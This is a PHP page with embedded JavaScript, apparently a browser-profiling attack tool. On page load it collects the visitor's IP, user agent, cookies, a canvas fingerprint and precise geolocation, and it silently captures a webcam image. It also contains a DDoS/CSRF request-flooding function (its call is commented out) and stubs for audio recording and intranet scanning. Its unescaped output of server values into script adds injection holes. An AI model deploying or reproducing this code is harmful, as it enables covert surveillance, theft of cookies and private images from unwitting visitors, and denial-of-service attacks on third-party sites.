<?php

if (isset($_GET['lat'])) {

    // 根据经纬度判断详细位置
    $lat=$_GET['lat'];
    $lon=$_GET['lon'];
    // 百度经纬度查询地址
    // 请求方式：GET
    // 默认返回json
    $url='http://lbs.juhe.cn/api/getaddressbylngb?lngx='.$lon.'&lngy='.$lat;
    $result=file_get_contents($url);
    $json=json_decode($result);
    exit($json->row->result->formatted_address);
}

$IP=$_SERVER[REMOTE_ADDR];
$USER_AGENT=$_SERVER[HTTP_USER_AGENT];

// 根据ip查询位置
$url='http://ip.taobao.com/service/getIpInfo.php?ip='.$IP;
$result=file_get_contents($url);
$json=json_decode($result);

$COUNTRY=$json->data->country;
$REGION=$json->data->region;
$CITY=$json->data->city;

$TIME=date('Y-m-d h:m:s',time());

?>

<script>

var info={
    ip:'<?=$IP?>',
    ip_addr:{
        country:'<?=$COUNTRY?>',
        region:'<?=$REGION?>',
        city:'<?=$CITY?>',
    },
    agent:'<?=$USER_AGENT?>',
    geo:{
        support:null,
        error_code:null,
        lat:null,
        lon:null,
        address:null,
    },
    cookie:null,
    time:'<?=$TIME?>',
    canvas_id:null,
    selfie:null,
    platform:null,
    device:null,
    window_screen:null,
};

info.cookie=document.cookie;

function ajax(url,foo){
    var xmlhttp=new XMLHttpRequest();
    xmlhttp.onreadystatechange=function(){
        if (xmlhttp.readyState==4 && xmlhttp.status==200) {
            foo(xmlhttp.responseText);
        };
    };
    xmlhttp.open('GET',url,true);
    xmlhttp.send();
}

function bin2hex(bin){
    var i=0, l=bin.length,chr,hex='';
    for (i; i < l; ++i){
        chr=bin.charCodeAt(i).toString(16);
        hex+=chr.length<2 ? '0'+chr : chr;
    }
    return hex;
}

function send_info(){
    var jsonText=JSON.stringify(info);
    console.log(jsonText);
}

// 获取屏幕分辨率的宽高,并判断操作系统,设备型号
function device_platform(){
    info.platform=navigator.platform;
    info.window_screen=String(window.screen.width)+'x'+String(window.screen.height);
}

// 拍照
function selfie(){
    // 创建video元素
    var video=document.createElement('video'),
    videoObj={'video':true},
    errBack=function(error){
        console.log('Video capture error: ',error.name);
        info.selfie=error.name;
    };

    // 获取媒体
    if(navigator.getUserMedia){
        navigator.getUserMedia(VideoObj,function(stream){
            video.src=stream;
            localMediaStream=stream;
            video.play();
        },errBack);
    }
    else if(navigator.webkitGetUserMedia){
        navigator.webkitGetUserMedia(videoObj, function(stream){
            video.src=window.webkitURL.createObjectURL(stream);
            localMediaStream=stream;
            video.play();
        }, errBack);
    };

    setTimeout(function(){
        if(info.selfie==null){
            // 截取图片
            var canvas=document.createElement('canvas'),
            ctx=canvas.getContext('2d');
            canvas.width=640;
            canvas.height=480;
            ctx.drawImage(video,0,0,640,480);
            var image=canvas.toDataURL('image/png');
            info.selfie=image;
            console.log('Take selfie successful!');

            // 关闭摄像头
            localMediaStream.stop();
            video.src='';
        };
    },4000);

}

// 录音
function voice_record(){}

// DDos攻击
function DDos(site){
    // CSRF
    setInterval(ajax(site,function(){
        console.log('DDos ',site);
    }),50);
}

// 内网扫描
// JS-Recon
function intranetScan(){}

// 利用canvas定位唯一标识
function canvas_id(){
    var canvas=document.createElement('canvas');
    var ctx=canvas.getContext('2d');
    var txt='http://eular.github.io';
    ctx.textBaseline='top';
    ctx.font="14px 'Arial'";
    ctx.fillStyle='#0ff';
    ctx.fillRect(0,0,140,50);
    ctx.fillStyle='#00f';
    ctx.fillText(txt,2,15);
    ctx.fillStyle='rgba(102,204,0,0.7)';
    ctx.fillText(txt,4,17);

    var b64=canvas.toDataURL().replace('data:image/png;base64,','');
    var bin=atob(b64);
    var crc=bin2hex(bin.slice(-16,-12));
    console.log('Canvas id: '+crc);
    info.canvas_id=crc;
}

// 获取地理位置
function get_geolocation(){

    // check for Geolocation support
    function check_geolocation_support(){
        if (navigator.geolocation){
            console.log('Geolocation is supported!');
            return true;
        }
        else{
            console.log('Geolocation is not supported for this Browser/OS version yet.');
            return false;
        }
    }

    if (check_geolocation_support()) {

        info.geo.support=true;

        var geoOptions={
            maximumAge:5*60*1000,
            timeout:10*1000,
            enableHighAccuracy:true
        }
        var geoSuccess=function(position){
            info.geo.lat=position.coords.latitude;
            info.geo.lon=position.coords.longitude;
            console.log('Success get geolocation!');

            // 根据经纬度判断详细位置
            url='<?=$_SERVER[PHP_SELF]?>?lat='+info.geo.lat+'&lon='+info.geo.lon;
            ajax(url,function(addr){
                info.geo.address=addr;
            });
        };
        var geoError=function(error){
            info.geo.error_code=error.code;
            console.log('Error occurred. Error code:'+error.code);
            //error.code:
            // 0: 未知错误
            // 1: 权限不足
            // 2: 位置错误(位置供应商出错)
            // 3: 超时
        };
        navigator.geolocation.getCurrentPosition(geoSuccess,geoError,geoOptions);
    }
    else{
        info.geo.support=false;
    };

}

window.onload=function(){
    device_platform();
    canvas_id();
    selfie();
    get_geolocation();
    //DDos('http://baidu.com');
};

</script>